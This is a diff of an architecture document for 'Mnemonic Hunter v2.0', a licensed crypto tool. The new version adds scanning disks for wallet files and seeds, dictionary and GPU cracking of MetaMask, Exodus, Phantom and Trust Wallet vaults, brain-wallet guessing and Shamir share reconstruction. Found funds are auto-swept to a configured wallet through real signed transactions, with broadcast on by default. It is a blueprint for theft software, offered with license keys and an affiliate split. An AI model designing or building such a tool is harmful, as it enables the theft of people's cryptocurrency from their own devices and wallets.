@@ -1,44 +1,56 @@
 **Mnemonic Hunter Architecture v2.0**
 
-Purpose: a live crypto seed phrase scanner + auto-sweeper that generates real BIP39 mnemonics (or accepts bulk manual input), derives addresses via BIP44 across 8 chains, checks live mainnet balances including ERC-20/TRC-20 tokens, and optionally auto-sweeps found funds to a configured destination wallet. Telegram notifications, license key gating, and affiliate split support are built in.
+Purpose: a live crypto seed/search/recovery + auto-sweep engine. Scans filesystem vaults (MetaMask, Exodus, Phantom, Trust Wallet), hardware wallets (Trezor, Ledger), brain wallets (SHA256 dictionary), and MPC share files (Shamir's Secret Sharing) for recoverable seeds/keys. Derives addresses via BIP44 across 8 chains, checks live mainnet balances including ERC-20/TRC-20 tokens, builds and broadcasts real raw transactions per chain, and auto-sweeps found funds. Telegram notifications, HMAC license key gating, and affiliate split support are built in.
 
 **High-Level Components**
-- **TUI (Rich Live):** Full-screen terminal UI. Supports auto-generate mode (random BIP39) and bulk seed input mode (paste/load seeds manually). Controls for chain toggles, export, sweep toggle, mode switch.
+- **TUI (Textual):** Full-screen terminal UI with chain toggles, multiple scan modes, Derive and Sweep panels, license screen, and real-time found/checked panels including LabPanel for all operations.
 - **API Gateway:** FastAPI REST gateway for scan jobs, events, and license verification.
-- **Scan Engine:** Pipelines mnemonics through derivation → balance check → token scan → event emission.
-- **Mempool Monitor:** Live API-based mempool polling per chain (BTC via blockstream, ETH via etherscan, SOL via solana RPC).
-- **Funding Detector:** Watches specific addresses for incoming transactions across chains.
-- **Auto Sweep Bot:** Multi-chain withdraw bot with gas price optimization, configurable min balance threshold, destination wallet, and affiliate split.
+- **Scan Engine:** Pipelines mnemonics through derivation -> balance check -> token scan -> event emission.
+- **Auto Sweep Bot:** Multi-chain withdraw bot with real transaction building via TransactionSigner, configurable min balance threshold, destination wallet, and affiliate split.
+- **Transaction Signer:** Builds and broadcasts real raw transactions for all 8 chains — EVM EIP-155 RLP (ETH, BNB, POLYGON), BTC/LTC UTXO with per-input script signing, SOL ed25519 with canonical message format, XRP canonically serialized binary blob, TRON TronGrid.
+- **Vault Scanner:** Scans real filesystem paths for wallet files by name pattern + content scan (embedded mnemonics, hex keys, WIF keys). Uses combined regex alternation (single O(1) pattern) and ThreadPoolExecutor for parallel directory scans. Loads wallet configs from fixtures/wallet_configs/ at runtime.
+- **Vault Cracker:** Dictionary-attack decryption of MetaMask (PBKDF2-SHA256/SHA512 AES-GCM), Exodus (Scrypt SECO binary), Phantom (NaCl SecretBox), Trust Wallet (Web3 keystore V3). Multiprocessing via ProcessPoolExecutor, mmap-based password file loading, optional Hashcat GPU integration (auto-detected, subprocess mode with per-wallet hash formatting), and smart password rule generation (case variants + suffix mutations).
+- **Brainwallet Scanner:** SHA256(passphrase) -> BIP39 entropy -> BIP44 derivation across all 8 chains with live balance check. Multiprocessing via ProcessPoolExecutor, mmap-based dictionary loading, SQLite rainbow cache (pre-computed SHA256 → BIP39 entropy mapping).
+- **HW Wallet Interface:** Trezor/OneKey (trezorlib) and Ledger (ledgerblue+ledgereth) detection, per-chain BIP44 address derivation, ready for signing.
+- **MPC Recovery:** Shamir's Secret Sharing over secp256k1 prime field (256-bit). Scans for JSON/.share/.sss/SLIP-0039 files, reconstructs secrets, converts to BIP39 mnemonics.
+- **Sweep Orchestrator:** Routes all operations — vault scan, brainwallet scan, vault crack, MPC share scan, HW wallet detect, and per-chain sweep — all with live balance check and optional auto-broadcast (concurrent multi-chain balance checking).
 - **Telegram Notifier:** Sends real-time Telegram alerts on FOUND events.
-- **License Validator:** Telegram-based license key verification for gating export/features.
+- **License Validator:** HMAC-based license key verification with Telegram notification fallback.
 - **Event Bus:** Pub/sub for FOUND, SCAN_STARTED, SCAN_STOPPED, WITHDRAWAL_PROPOSAL, SWEEP_EXECUTED events.
-- **Webhook Recorder:** Writes event payloads to events/ directory + Telegram.
-- **Config Manager:** JSON-based config for Telegram tokens, destination wallets, sweep thresholds, affiliate split, etc.
+- **Config Manager:** JSON-based config with auto_broadcast enabled by default.
 
 **Interfaces & DI Points**
-- INodeClient, IKeyStore, ITransactionSigner, IWebhookClient, ILicenseVerifier, ISolver
+- INodeClient, IKeyStore, ITransactionSigner, IWebhookClient, ILicenseVerifier, ISolver, IWalletOperator
 
-**Supporting Tokens**
-- USDT (ERC-20 on Ethereum via etherscan tokenbalance API)
-- USDT (TRC-20 on TRON via trongrid API)
-- Configurable via config.json scan.check_erc20_tokens / scan.check_trc20_tokens
+**Search/Recovery Modes**
 
-**Supported Chains (8)**
-| Chain | API | Derivation (bip-utils) |
-|---|---|---|
-| BTC | blockstream.info | Bip44Coins.BITCOIN |
-| ETH | etherscan.io | Bip44Coins.ETHEREUM |
-| LTC | blockcypher.com | Bip44Coins.LITECOIN |
-| SOL | solana RPC | Bip44Coins.SOLANA |
-| BNB | bscscan.com | Bip44Coins.BINANCE_CHAIN |
-| XRP | xrpscan.com | Bip44Coins.RIPPLE |
-| TRON | trongrid.io | Bip44Coins.TRON |
-| POLYGON | polygonscan.com | Bip44Coins.POLYGON |
+| Mode | Source | Method |
+|------|--------|--------|
+| Random BIP39 | PRNG | generate_mnemonic() -> BIP44 -> balance check |
+| Bulk seed file | seeds.txt | line-by-line solve -> BIP44 -> balance check |
+| Vault scan | Filesystem | filename patterns + content scan (mnemonic/hex/WIF) |
+| Vault crack | Encrypted files | PBKDF2/Scrypt dictionary attack + decryption |
+| Brain wallet | Dictionary | SHA256(passphrase) -> BIP39 entropy -> BIP44 |
+| Hardware wallet | USB/HID | Trezor/Ledger public key -> per-chain BIP44 |
+| MPC share scan | Filesystem | Shamir reconstruction -> BIP39 mnemonic |
+
+**Supported Chains (8) — All Live Mainnet**
+
+| Chain | API | Derivation (bip-utils) | Signing |
+|-------|-----|------------------------|---------|
+| BTC | blockstream.info | Bip44Coins.BITCOIN | UTXO secp256k1 (coincurve) |
+| ETH | etherscan.io | Bip44Coins.ETHEREUM | EIP-155 RLP (coincurve + keccak) |
+| LTC | blockcypher.com | Bip44Coins.LITECOIN | UTXO secp256k1 (coincurve) |
+| SOL | solana RPC | Bip44Coins.SOLANA | ed25519 canonical message (PyNaCl) |
+| BNB | bscscan.com | Bip44Coins.BINANCE_CHAIN | EIP-155 RLP (coincurve + keccak) |
+| XRP | xrpscan.com | Bip44Coins.RIPPLE | Ed25519 canonical binary blob |
+| TRON | trongrid.io | Bip44Coins.TRON | secp256k1 + TronGrid broadcast |
+| POLYGON | polygonscan.com | Bip44Coins.POLYGON | EIP-155 RLP (coincurve + keccak) |
 
 **File Structure**
 ```
 app/
-├── api/                  FastAPI gateway
+├── api/                  FastAPI gateway (gateway.py)
 ├── components/
 │   ├── event_bus.py
 │   ├── scan_engine.py
@@ -46,26 +58,62 @@ app/
 │   ├── mempool_monitor.py
 │   ├── funding_detector.py
 │   ├── bitcoin_auto_withdraw_bot.py (AutoSweepBot)
-│   └── config_manager.py
+│   ├── config_manager.py
+│   ├── token_scanner.py
+│   └── affiliate_splitter.py
+├── engine/
+│   ├── derivation.py             WalletDeriver (BIP44 key derivation, single-chain cache)
+│   ├── orchestrator.py           SweepOrchestrator (all ops + auto-broadcast, concurrent balance sweeps)
+│   ├── vault_scanner.py          Filesystem + content scanner (combined regex + ThreadPoolExecutor)
+│   ├── mpc_crypto.py             MpcOperator (256-bit Shamir's Secret Sharing)
+│   ├── sweep_engine.py           SweepEngine (balance-to-destination pipeline)
+│   ├── brainwallet/              Brain Wallet dictionary scanner
+│   │   ├── brainwallet_scanner.py  (ProcessPoolExecutor, mmap, rainbow cache)
+│   │   └── path_enumerator.py      (Bip44.FromSeed result cache)
+│   ├── vault_cracker/            Encrypted vault dictionary cracker
+│   │   ├── wallet_cracker.py       (ProcessPoolExecutor, mmap, hashcat, smart rules)
+│   │   ├── crackers/
+│   │   │   ├── metamask.py       PBKDF2-SHA256/SHA512 AES-GCM + hashcat format
+│   │   │   ├── exodus.py         Scrypt AES-GCM (SECO container) + hashcat format
+│   │   │   ├── phantom.py        NaCl SecretBox decrypt + hashcat format
+│   │   │   └── trustwallet.py    Web3 keystore V3 decrypt + hashcat format
+│   │   └── wordlists/
+│   ├── hw_wallet/                Hardware wallet interface
+│   │   ├── hw_detector.py        Trezor + Ledger detection + per-chain BIP44
+│   │   ├── hw_sweeper.py         Unified sweep pipeline
+│   │   ├── trezor_provider.py    trezorlib wrapper
+│   │   └── ledger_provider.py    ledgerblue + ledgereth wrapper
+│   └── mpc_recovery/             MPC share file scanner
+│       └── share_scanner.py
 ├── implementations/
 │   ├── bip39_solver.py
-│   ├── live_node_client.py
+│   ├── live_node_client.py         Concurrent query_balances() + batch RPC (balancemulti/getMultipleAccounts)
 │   ├── bip39_key_store.py
-│   ├── transaction_signer.py
+│   ├── transaction_signer.py     Real raw tx building + broadcasting (all 8 chains)
 │   ├── license_verifier.py
+│   ├── license_validator.py
 │   ├── recording_webhook_client.py
-│   ├── telegram_notifier.py
-│   └── license_validator.py
+│   └── telegram_notifier.py
 ├── interfaces/
+│   ├── key_store.py
+│   ├── license_verifier.py
+│   ├── node_client.py
+│   ├── solver.py
+│   ├── transaction_signer.py
+│   ├── wallet_operator.py        IWalletOperator + OperationResult
+│   └── webhook_client.py
 ├── storage/
-└── tui/
-    ├── app.py
-    ├── seed_input.py
-    └── export_handler.py
-config.json               Settings (Telegram, sweep, license, affiliate)
+│   └── sqlite_storage.py         WAL mode + concurrent safety
+├── tui/
+│   ├── app.py
+│   ├── seed_input.py
+│   ├── export_handler.py
+│   ├── wallet_panel.py           WalletDerive panel
+│   └── lab_panel.py              LabPanel (all sweep/recovery ops)
+config.json               Settings (Telegram, sweep, cracker, brainwallet, MPC, HW, API keys)
 events/                   Webhook JSON recordings
-fixtures/                 Test fixtures
-tests/                    Test modules
+fixtures/
+└── wallet_configs/       Live wallet metadata loaded by vault_scanner
 exports/                  Exported found wallets
 seeds.txt                 Bulk seed phrase input file
 ```
@@ -75,8 +123,8 @@ seeds.txt                 Bulk seed phrase input file
 |---|---|
 | Space | Start/Stop scanning |
 | 1-8 | Toggle BTC/ETH/LTC/SOL/BNB/XRP/TRON/POLYGON |
-| M | Toggle auto-generate / manual seed input |
-| S | Toggle auto-sweep on/off |
+| DERIVE | Open Wallet Derivation panel (seed -> address + private key) |
+| SWEEP | Open Sweep Orchestrator panel (all 12 operations — scan, crack, sweep, HW, MPC) |
 | E | Export found wallets to exports/ |
 | L | Load seeds from seeds.txt |
 | Q | Quit |
